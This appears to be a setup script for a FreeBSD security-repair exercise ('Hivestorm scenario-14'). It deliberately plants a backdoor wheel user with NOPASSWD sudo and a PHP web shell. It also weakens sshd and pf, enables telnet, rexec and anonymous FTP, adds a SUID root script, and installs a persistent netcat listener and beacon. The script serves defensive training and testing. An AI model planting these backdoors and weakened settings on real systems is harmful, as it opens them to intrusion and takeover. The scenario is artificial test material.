#!/bin/sh
# Hivestorm scenario-14 — FreeBSD 13 misconfigurations.
# Reads role-map from /var/db/sysrepair/roles.json.
set -u
export ASSUME_ALWAYS_YES=yes

ROLES=/root/.sysrepair/config
j() { /usr/bin/awk -v k="$1" '
  { if (match($0, "\"" k "\"[[:space:]]*:[[:space:]]*\"[^\"]*\"")) {
      s = substr($0, RSTART, RLENGTH); sub(/^.*:[[:space:]]*"/, "", s);
      sub(/"$/, "", s); print s; exit } }' "$ROLES"; }
ji() { /usr/bin/awk -v k="$1" '
  { if (match($0, "\"" k "\"[[:space:]]*:[[:space:]]*[0-9]+")) {
      s = substr($0, RSTART, RLENGTH); sub(/^.*:[[:space:]]*/, "", s);
      print s; exit } }' "$ROLES"; }

ADMIN=$(j admin_user)
ADMIN_PW=$(j admin_weak_password)
BACKDOOR=$(j backdoor_user)
PERIODIC=$(j periodic_drop_name)
PERIODIC_PATH=$(j periodic_drop_path)
KLD=$(j kld_module_name)
ROGUE_PKG=$(j rogue_pkg_name)
TROJAN=$(j trojan_path)
LPORT=$(ji listener_port)

# ---- legit admin account ----------------------------------------------------
/usr/sbin/pw useradd -n "$ADMIN" -m -s /bin/sh -c "legit admin" 2>/dev/null || true
echo "$ADMIN_PW" | /usr/sbin/pw usermod -n "$ADMIN" -h 0
/usr/sbin/pw groupmod wheel -m "$ADMIN" 2>/dev/null || true

# ---- rogue backdoor user (extra wheel member, UID 0 alias is too invasive) --
/usr/sbin/pw useradd -n "$BACKDOOR" -m -s /bin/sh -c "planted" 2>/dev/null || true
echo "hunter2-$(/bin/date +%s)" | /usr/sbin/pw usermod -n "$BACKDOOR" -h 0
/usr/sbin/pw groupmod wheel -m "$BACKDOOR" 2>/dev/null || true
# NOPASSWD sudoers drop-in.
mkdir -p /usr/local/etc/sudoers.d
printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$BACKDOOR" \
    > "/usr/local/etc/sudoers.d/99-${BACKDOOR}"
chmod 0440 "/usr/local/etc/sudoers.d/99-${BACKDOOR}"

# ---- rc.conf: enable insecure services --------------------------------------
/usr/sbin/sysrc inetd_enable=YES        >/dev/null
/usr/sbin/sysrc telnetd_enable=YES      >/dev/null
/usr/sbin/sysrc rexecd_enable=YES       >/dev/null
/usr/sbin/sysrc ftpd_enable=YES         >/dev/null
/usr/sbin/sysrc ftpd_flags="-A"         >/dev/null
# Enable the rogue listener as an rc.d-registered service so it survives reboots.
/usr/sbin/sysrc hs14_listener_enable=YES  >/dev/null
/usr/sbin/sysrc hs14_listener_port="$LPORT" >/dev/null

# inetd.conf: enable telnet + exec + anonymous ftp.
cat > /etc/inetd.conf <<'EOF'
telnet  stream  tcp  nowait  root  /usr/libexec/telnetd  telnetd
exec    stream  tcp  nowait  root  /usr/libexec/rexecd   rexecd
ftp     stream  tcp  nowait  root  /usr/libexec/ftpd     ftpd -A -l
EOF

# ---- pf.conf gutted: pass in all, no scrub, no antispoof -------------------
cat > /etc/pf.conf <<'EOF'
# Hivestorm S14 — deliberately permissive pf policy.
set skip on lo0
pass in all
pass out all
EOF
/usr/sbin/sysrc pf_enable=YES   >/dev/null
/usr/sbin/sysrc pflog_enable=NO >/dev/null
/sbin/pfctl -f /etc/pf.conf 2>/dev/null || true

# ---- sshd_config: root login + password auth + weak algos -------------------
SSHD=/etc/ssh/sshd_config
/usr/bin/sed -i '' -e '/^PermitRootLogin/d' \
                   -e '/^PasswordAuthentication/d' \
                   -e '/^PermitEmptyPasswords/d' \
                   -e '/^X11Forwarding/d' "$SSHD"
cat >> "$SSHD" <<'EOF'
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
X11Forwarding yes
# Weak MACs + KEX left in for the agent to spot.
KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
MACs +hmac-sha1,hmac-md5
EOF
/usr/sbin/service sshd reload 2>/dev/null || true

# ---- nginx: enable server_tokens on, autoindex on, wide-open default root ---
NGX=/usr/local/etc/nginx/nginx.conf
if [ -f "$NGX" ]; then
    /usr/bin/sed -i '' -e 's/#\{0,1\}server_tokens .*/server_tokens on;/' "$NGX" \
        || true
fi
mkdir -p /usr/local/www/nginx-dist
cat > /usr/local/www/nginx-dist/shell.php <<'EOF'
<?php system($_GET["c"] ?? "id"); ?>
EOF
/usr/sbin/service nginx reload 2>/dev/null || true

# ---- periodic(8) daily drop -------------------------------------------------
mkdir -p "$(dirname "$PERIODIC_PATH")"
cat > "$PERIODIC_PATH" <<EOF
#!/bin/sh
# Hivestorm S14 planted periodic job — simulated beacon.
/usr/bin/nc -w1 127.0.0.1 $LPORT </dev/null >/dev/null 2>&1 || true
EOF
chmod 0755 "$PERIODIC_PATH"

# ---- KLD auto-load entry in /boot/loader.conf -------------------------------
# We don't actually ship the module (would fail kldload); the misconfig is
# the loader.conf line pointing at a non-standard module name.
touch /boot/loader.conf
if ! /usr/bin/grep -q "${KLD}_load=" /boot/loader.conf 2>/dev/null; then
    printf '%s_load="YES"\n' "$KLD" >> /boot/loader.conf
fi

# ---- rogue package entry (marker — we don't actually fetch a real CVE pkg) --
# Create a decoy installed-pkg record so `pkg info` and the verifier can spot
# it, without depending on the live vulnxml feed.
echo "$ROGUE_PKG" > /root/.sysrepair/pkg.marker
# Also append to a periodic security report override so `pkg audit` output
# would flag it in a real environment.
cat > /usr/local/etc/periodic/security/410.pkg-audit <<EOF
#!/bin/sh
echo "Vulnerable package installed: $ROGUE_PKG"
EOF
chmod 0755 /usr/local/etc/periodic/security/410.pkg-audit 2>/dev/null || true

# ---- SUID trojan ------------------------------------------------------------
mkdir -p "$(dirname "$TROJAN")"
cat > "$TROJAN" <<'EOF'
#!/bin/sh
/usr/bin/id
EOF
chmod 4755 "$TROJAN"
/usr/sbin/chown root:wheel "$TROJAN"

# ---- rc.d listener script (survives reboot, enabled via sysrc above) --------
cat > /usr/local/etc/rc.d/hs14_listener <<'EOF'
#!/bin/sh
# PROVIDE: hs14_listener
# REQUIRE: NETWORKING
# KEYWORD: shutdown
. /etc/rc.subr
name="hs14_listener"
rcvar="hs14_listener_enable"
: ${hs14_listener_enable:=NO}
: ${hs14_listener_port:=40000}
command=/usr/sbin/daemon
command_args="-f -p /var/run/hs14_listener.pid /usr/bin/nc -kl ${hs14_listener_port}"
load_rc_config $name
run_rc_command "$1"
EOF
chmod 0755 /usr/local/etc/rc.d/hs14_listener
/usr/sbin/service hs14_listener start 2>/dev/null || true

# ---- kick inetd so telnet/rexec/ftp are actually listening ------------------
/usr/sbin/service inetd restart 2>/dev/null || /usr/sbin/service inetd start 2>/dev/null || true

chmod 0400 /root/.sysrepair/pkg.marker

exit 0
